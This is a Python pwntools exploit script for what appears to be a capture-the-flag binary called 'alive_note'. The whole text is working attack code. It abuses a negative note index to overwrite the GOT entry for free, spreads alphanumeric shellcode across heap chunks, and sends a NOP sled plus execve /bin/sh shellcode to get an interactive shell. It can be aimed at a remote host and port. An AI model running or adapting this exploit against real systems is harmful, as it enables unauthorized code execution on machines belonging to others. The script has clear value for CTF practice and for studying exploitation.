#/usr/env/bin python
#-*- coding: utf-8 -*-
from pwn import *

def add(Index,Name):
    io.sendlineafter('Your choice :',str(1))
    io.sendlineafter('Index :',str(Index))
    io.sendafter('Name :',Name)
    io.recvuntil('Done !\n')

def show(Index):
    io.sendlineafter('Your choice :',str(2))
    io.sendlineafter('Index :',str(Index))

def delete(Index):
    io.sendlineafter('Your choice :',str(3))
    io.sendlineafter('Index :',str(Index))

def padding():
    add(-1,"AAAAAAAA")
    add(-1,"BBBBBBBB")
    add(-1,"CCCCCCCC")

def exploit(flag):
    gdb.attach(io)
    add(-27,"PYjAXEq ") #change free symbols 
    padding()           
    add(0,"4AHEEEq ")  
    padding()         
    add(1,"0AF49Eq ")
    padding()       
    add(2,"0AGjzZq ")
    padding()        
    add(3,"j7X44E2F")
    #gdb.attach(io,"b *0x080488E9")
    delete(2)

    log.info("execve shellcode")
    payload = "\x90"*72
    payload += asm(shellcraft.sh())
    io.sendline(payload)
    raw_input("Go?")

    io.interactive()

if __name__ == "__main__":
    context.binary = "./alive_note"
#    context.terminal = ['tmux','sp','-h']
    context.log_level = 'debug'
    elf = ELF('./alive_note')
    if len(sys.argv)>1:
        io = remote(sys.argv[1],sys.argv[2])
        exploit(0)
    else:
        io = process('./alive_note')
        exploit(1)

